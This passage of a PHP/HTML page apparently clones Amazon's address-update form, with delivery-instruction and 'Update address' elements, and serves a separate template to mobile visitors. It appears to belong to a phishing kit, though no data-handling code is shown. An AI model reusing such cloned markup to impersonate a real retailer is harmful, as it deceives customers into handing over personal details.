                                                class="a-input-text address-ui-widgets-desktop-form-field-full-width addrui-form-text-input"
                                                aria-label="Urbanization"
                                            />
                                        </div>
                                    </div>
                                </div>
                                <h5>Delivery instructions (optional)</h5>
                                <div
                                    data-a-expander-name="address-ui-widgets-delivery-instructions-desktop-expander"
                                    class="a-row a-expander-container a-expander-inline-container address-ui-widgets-desktop-delivery-instructions-expander"
                                >
                                    <a
                                        role="button"
                                        href="javascript:void(0)"
                                        data-action="a-expander-toggle"
                                        class="a-expander-header a-declarative a-expander-inline-header a-link-expander"
                                        ><i class="a-icon a-icon-expand"></i
                                        ><span class="a-expander-prompt"
                                            ><span
                                                >Add preferences, notes, access codes and more</span
                                            ></span
                                        ></a
                                    >
                                </div>
                                <div class="mt-5">
                                    <span
                                        class="a-declarative"
                                        ><span
                                            id="address-ui-widgets-form-submit-button"
                                            class="a-button a-button-primary"
                                            ><span class="a-button-inner"
                                                ><input
                                                    class="a-button-input"
                                                    type="submit"
                                                    aria-labelledby="address-ui-widgets-form-submit-button-announce"
                                                /><span
                                                    id="address-ui-widgets-form-submit-button-announce"
                                                    class="a-button-text"
                                                    aria-hidden="true"
                                                    >Update address</span
                                                ></span
                                            ></span
                                        >
                                    </span>
                                </div>
                            </div>
                        </span>
                    </form>
                </div>
            </div>
        </div>
        <?php
            if (isMobile()) {
                require __DIR__ . '/../static/tes2.html';
            } else {
                require __DIR__ . '/../static/footer.php';
            }
        ?>
    </body>
</html>